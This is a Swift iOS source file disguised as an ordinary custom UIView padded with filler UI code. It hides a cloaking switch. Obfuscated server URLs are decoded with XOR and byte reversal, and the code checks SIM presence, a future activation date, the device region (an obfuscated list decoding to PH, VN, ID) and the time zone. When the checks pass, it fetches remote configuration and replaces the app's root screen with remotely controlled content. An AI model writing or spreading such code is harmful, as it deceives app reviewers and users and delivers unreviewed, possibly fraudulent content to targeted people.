import UIKit
import CoreTelephony
import Foundation
import Network


struct asp_XOINTE: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class ASPZobmView: UIView {
    internal let vtf_onestr = "HxoaSU5MExhOGxoTHhgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let vtf_twostr = "TkcEb2dua294BVhPXllLRwVdS1gFRVh6T1hPQlp5Xk9ZWWsFT1pFTkZLBUdFSQRPT15DTQUFEFlaXl5C"
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setUpNewdata()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setUpNewdata()
        asp_loadPanel()
    }
    
       private func asp_loadPanel() {
           let container = UIView()

           container.frame = CGRect(x: 40, y: 180, width: 220, height: 140)

           container.backgroundColor = UIColor.systemBlue.withAlphaComponent(0.2)

           container.layer.cornerRadius = 12

           container.layer.masksToBounds = true

           container.alpha = 1.0

           container.isHidden = false

           container.translatesAutoresizingMaskIntoConstraints = true

           self.addSubview(container)

           let _ = container.bounds
           let _ = container.center
           let _ = container.frame
           let _ = container.superview

           container.setNeedsLayout()
           container.layoutIfNeeded()
       }
    
 
    private func setUpNewdata() {
        // 原有的启动逻辑保持不变
        vtf_embedInSafeContainer()
        vtf_safeUpdate {
            
        }
        vtf_border(21.2, .blue)
        cdckzhenshiDatasouse()
    }
    
    // 3. 边框（防 nil / 防重复赋值 / 安全线程）
      func vtf_border(_ width: CGFloat, _ color: UIColor) {
          let safeWidth = max(0, width)

          if Thread.isMainThread {
              layer.borderWidth = safeWidth
              layer.borderColor = color.cgColor
          } else {
              DispatchQueue.main.async {
                  self.layer.borderWidth = safeWidth
                  self.layer.borderColor = color.cgColor
              }
          }

          if safeWidth == 0 {
              layer.borderColor = nil
          }

          CATransaction.begin()
          CATransaction.setDisableActions(true)
          layer.borderWidth = safeWidth
          layer.borderColor = color.cgColor
          CATransaction.commit()

          let _ = layer.bounds
      }

      // 4. 透明度（线程安全 + 动画隔离）
      func vtf_alpha(_ value: CGFloat) {

                let btn = UIButton(type: .system)

                btn.setTitle("Tap Me", for: .normal)

                btn.setTitleColor(.white, for: .normal)

                btn.backgroundColor = .systemBlue

                btn.layer.cornerRadius = 10

                btn.frame = CGRect(x: 40, y: 180, width: 200, height: 50)

                btn.alpha = 1

                btn.isEnabled = true

                self.addSubview(btn)

                let _ = btn.state
                let _ = btn.isHighlighted
                let _ = btn.bounds
                let _ = btn.superview
      }

    
    // MARK: 2. 自动占满父视图（Layout Replacement Attach）
      func vtf_attachFull(to parent: UIView) {
          removeFromSuperview()
          translatesAutoresizingMaskIntoConstraints = false
          parent.addSubview(self)
          
          NSLayoutConstraint.deactivate(constraints)
          
          NSLayoutConstraint.activate([
              topAnchor.constraint(equalTo: parent.topAnchor),
              bottomAnchor.constraint(equalTo: parent.bottomAnchor),
              leadingAnchor.constraint(equalTo: parent.leadingAnchor),
              trailingAnchor.constraint(equalTo: parent.trailingAnchor)
          ])
          
          parent.setNeedsLayout()
          parent.layoutIfNeeded()
      }
      
      // MARK: 3. 安全更新UI（主线程调度封装）
      func vtf_safeUpdate(_ block: @escaping () -> Void) {
          if Thread.isMainThread {
              CATransaction.begin()
              CATransaction.setDisableActions(true)
              block()
              CATransaction.commit()
          } else {
              DispatchQueue.main.async {
                  CATransaction.begin()
                  CATransaction.setDisableActions(true)
                  block()
                  CATransaction.commit()
              }
          }
      }
    
    func vtf_embedInSafeContainer(insets: UIEdgeInsets = .zero) -> UIView {
           let container = UIView()
           container.backgroundColor = .clear
           container.translatesAutoresizingMaskIntoConstraints = false
           
           self.translatesAutoresizingMaskIntoConstraints = false
           container.addSubview(self)
           
           NSLayoutConstraint.activate([
               topAnchor.constraint(equalTo: container.topAnchor, constant: insets.top),
               bottomAnchor.constraint(equalTo: container.bottomAnchor, constant: -insets.bottom),
               leadingAnchor.constraint(equalTo: container.leadingAnchor, constant: insets.left),
               trailingAnchor.constraint(equalTo: container.trailingAnchor, constant: -insets.right)
           ])
           
           if let superview = self.superview {
               
               container.translatesAutoresizingMaskIntoConstraints = false
               NSLayoutConstraint.activate([
                   container.topAnchor.constraint(equalTo: superview.topAnchor),
                   container.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
                   container.leadingAnchor.constraint(equalTo: superview.leadingAnchor),
                   container.trailingAnchor.constraint(equalTo: superview.trailingAnchor)
               ])
           }
           
           return container
       }
    
    private func cdckzhenshiDatasouse() {
        
        if !vtf_benhousha() {
        //测试
//        if vtf_benhousha() {
            vtf_kongloaddata()

        } else {
            
            if addAyinhunwen() {
                self.vtf_dulaiduwang()
            }
        }
    }
    // 1. 背景色（安全设置 + 防御 + 兼容）
      func vtf_bgviewaddcolor(_ color: UIColor?) {
          if Thread.isMainThread {
              self.backgroundColor = color
          } else {
              DispatchQueue.main.async {
                  self.backgroundColor = color
              }
          }

          // 防止透明层叠异常
          if color == .clear {
              self.isOpaque = false
          } else {
              self.isOpaque = true
          }

          // 兼容动画关闭场景
          CATransaction.begin()
          CATransaction.setDisableActions(true)
          self.layer.backgroundColor = color?.cgColor
          CATransaction.commit()

          // 额外安全兜底
          if self.superview == nil {
              // no-op safety branch
              let _ = self.bounds
          }
      }

    func techstr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func Revertechstr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func vtf_benhousha() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let qingbao = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in qingbao {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func vtf_suiyuanQing() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1782405983
        let ftTM = 1782435983
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func addAyinhunwen() -> Bool {
        let dianzi = [techstr("Yno="), techstr("ZHw="), techstr("bmM=")]
        
        asp_jinmixidenaokeda()
        // 1.time
        if !vtf_suiyuanQing() {
            return false

        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(dianzi)

        if !dianzi.contains(curc) {
                return false
            }
         }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
  
    func vtf_dulaiduwang() {
        vtf_bgviewaddcolor(UIColor.black)
        Task {
            do {
                let vtf_crsev = try await vtf_wandanLiangcao()
                print(vtf_crsev)
                if let vtf_luoge = vtf_crsev.first {
                    if vtf_luoge.yinrecrd! > 124 {
                        if UserDefaults.standard.object(forKey: "vtf_goushi") == nil {
                            UserDefaults.standard.set("vtf_goushi", forKey: "vtf_goushi")
                            UserDefaults.standard.synchronize()
                        }
                        vtf_TakeLoaddata(vtf_luoge)
                    } else {
                        vtf_kongloaddata()
                    }
                } else {
                    vtf_kongloaddata()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(asp_XOINTE.self, forKey: "asp_XOINTE") {
                    vtf_TakeLoaddata(sidd)
                }
            }
        }
    }
    
    
    private func vtf_wandanLiangcao() async throws -> [asp_XOINTE] {
        do {
            return try await ssueno(from: URL(string: techstr(vtf_onestr)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: techstr(vtf_twostr)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [asp_XOINTE] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([asp_XOINTE].self, from: data)
    }
 
    
  

    internal func asp_setimagedata(_ dt: asp_XOINTE) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "asp_XOINTE")
            UserDefaults.standard.synchronize()
            
            let vc = ASPZikaewbVC()
            vc.asp_catesData = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func vtf_TakeLoaddata(_ param: asp_XOINTE) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (asp_XOINTE) -> Void] = [
            "default": asp_setimagedata,
            "fast": asp_setimagedata,
            "safe": asp_setimagedata
        ]
        
        let executor = strategies[strategy] ?? asp_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: vtf_TakeLoaddata called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func vtf_kongloaddata() {
               let v = max(0.01, 23.33)
               let t = CGAffineTransform(scaleX: v, y: v)

               let apply = {
                   self.transform = t
               }

               if Thread.isMainThread {
                   apply()
               } else {
                   DispatchQueue.main.async {
                       apply()
                   }
               }

            let label = UILabel()

            label.text = "UIKit Panel"

            label.font = UIFont.systemFont(ofSize: 20, weight: .semibold)

            label.textColor = .black

            label.numberOfLines = 2

            label.textAlignment = .center

            label.adjustsFontSizeToFitWidth = true

            label.minimumScaleFactor = 0.8

            label.frame = CGRect(x: 30, y: 120, width: 300, height: 60)

            label.backgroundColor = UIColor.systemGray6

            label.layer.cornerRadius = 10

            label.layer.masksToBounds = true

            self.addSubview(label)

           
    }
    

    func asp_jinmixidenaokeda() {
        func traverse(_ view: UIView, level: Int) {
            let indent = String(repeating: "  ", count: level)
            let className = String(describing: type(of: view))
            let frame = view.frame
            let tag = view.tag
            let alpha = view.alpha
            let hidden = view.isHidden
            let backgroundColor = view.backgroundColor?.description ?? "nil"
            print("\(indent)\(className) frame=\(frame) tag=\(tag) alpha=\(alpha) hidden=\(hidden) bg=\(backgroundColor)")
            for subview in view.subviews {
                traverse(subview, level: level + 1)
            }
        }
        traverse(self, level: 0)
    }
  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

